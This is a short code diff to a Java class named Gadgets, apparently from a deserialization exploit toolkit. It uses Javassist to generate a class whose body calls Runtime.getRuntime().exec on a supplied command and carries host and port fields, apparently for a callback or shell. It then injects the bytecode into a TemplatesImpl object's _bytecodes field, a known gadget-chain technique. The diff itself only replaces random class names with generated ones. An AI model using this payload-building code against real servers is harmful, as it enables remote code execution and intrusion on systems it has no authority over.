@@ -17,7 +17,7 @@ public class Gadgets {
 
         String body = String.format("java.lang.Runtime.getRuntime().exec(\"%s\");", command);
 
-        ClassFile classFile = new ClassFile(false, MiscUtil.getRandStr(12), null);
+        ClassFile classFile = new ClassFile(false, MiscUtil.getClassName(), null);
         classFile.setMajorVersion(ClassFile.JAVA_8);
         classFile.setAccessFlags(AccessFlag.PUBLIC);
         CtClass clazz = pool.makeClass(classFile);
@@ -48,7 +48,7 @@ public class Gadgets {
         ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
         ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(port));
 
-        clazz.replaceClassName(clazz.getName(), MiscUtil.getRandStr(12));
+        clazz.replaceClassName(clazz.getName(), MiscUtil.getClassName());
 
         ReflectUtil.setFieldValue(templatesImpl, "_name", "Hello");
         ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
